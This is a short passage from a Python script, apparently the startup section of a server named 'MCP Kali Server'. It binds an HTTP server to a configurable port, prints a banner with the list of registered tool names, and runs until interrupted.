    port = int(sys.argv[1]) if len(sys.argv) > 1 else 3000
    server = HTTPServer(("0.0.0.0", port), MCPHandler)
    print(f"")
    print(f"  ╔══════════════════════════════════════╗")
    print(f"  ║   MCP Kali Server   port {port:<5}       ║")
    print(f"  ╚══════════════════════════════════════╝")
    print(f"")
    print(f"  Tools ({len(TOOLS)}): {', '.join(TOOLS.keys())}")
    print(f"")
    print(f"  Ctrl+C to stop")
    print(f"")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[stopped]")
